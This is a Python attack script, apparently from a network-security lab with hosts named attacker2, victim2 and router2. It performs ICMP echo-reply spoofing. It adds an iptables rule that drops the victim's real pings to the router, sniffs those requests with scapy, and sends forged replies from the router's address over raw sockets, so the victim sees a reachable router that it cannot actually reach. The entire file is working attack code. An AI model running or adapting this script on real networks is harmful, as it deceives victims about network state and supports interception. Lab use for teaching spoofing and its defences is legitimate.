#!/usr/bin/env python3
import atexit
import subprocess
import socket
import struct
from scapy.all import sniff, IP, ICMP, conf

# ─── CONFIG ─────────────────────────────────────────────────────────────────────
ROUTER_IP = "20.20.0.2"    # router2’s IP
VICTIM_IP = "20.10.0.2"    # victim2’s IP
IFACE     = "eth0"         # attacker2’s victim‐side interface

# iptables rule to drop real pings victim→router
DROP_RULE = [
    "iptables", "-I", "FORWARD",
    "-s", VICTIM_IP,
    "-d", ROUTER_IP,
    "-p", "icmp", "--icmp-type", "echo-request",
    "-j", "DROP"
]

# ─── CLEANUP ────────────────────────────────────────────────────────────────────
def cleanup():
    # remove the DROP rule
    subprocess.run(
        ["iptables", "-D", "FORWARD",
         "-s", VICTIM_IP,
         "-d", ROUTER_IP,
         "-p", "icmp", "--icmp-type", "echo-request",
         "-j", "DROP"],
        check=False
    )
    print("Removed iptables DROP rule.")

atexit.register(cleanup)

# ─── SETUP ──────────────────────────────────────────────────────────────────────
def setup():
    # insert the DROP rule
    subprocess.run(DROP_RULE, check=True)
    print("Inserted iptables DROP rule to block victim→router ICMP.")

# ─── CHECKSUM HELPER ────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ─── PACKET HANDLER ─────────────────────────────────────────────────────────────
def handle_request(pkt):
    if IP in pkt and ICMP in pkt and pkt[IP].dst == ROUTER_IP and pkt[ICMP].type == 8:
        ic = pkt[ICMP]
        print(f"Sniffed Echo Request id={ic.id}, seq={ic.seq}")

        # build IP header (src=router, dst=victim)
        ip_hdr = struct.pack(
            "!BBHHHBBH4s4s",
            (4<<4)|5, 0,
            20 + 8 + len(ic.payload),
            0, 0,
            64,                      # TTL
            socket.IPPROTO_ICMP,
            0,
            socket.inet_aton(ROUTER_IP),
            socket.inet_aton(VICTIM_IP),
        )
        ip_hdr = ip_hdr[:10] + struct.pack("!H", checksum(ip_hdr)) + ip_hdr[12:]

        # build ICMP Echo-Reply
        payload = bytes(ic.payload)
        icmp_pfx = struct.pack("!BBHHH", 0, 0, 0, ic.id, ic.seq)
        icmp_ck = checksum(icmp_pfx + payload)
        icmp_hdr = struct.pack("!BBHHH", 0, 0, icmp_ck, ic.id, ic.seq)

        packet = ip_hdr + icmp_hdr + payload

        # send raw reply
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.sendto(packet, (VICTIM_IP, 0))

        print(f"Sent spoofed Echo Reply to {VICTIM_IP}")

# ─── MAIN ────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # ensure BPF filters work
    conf.use_pcap = True

    setup()
    print(f"Listening for ICMP Echo Requests to {ROUTER_IP} on {IFACE}…")
    sniff(
        iface=IFACE,
        filter=f"icmp and dst {ROUTER_IP}",
        prn=handle_request
    )
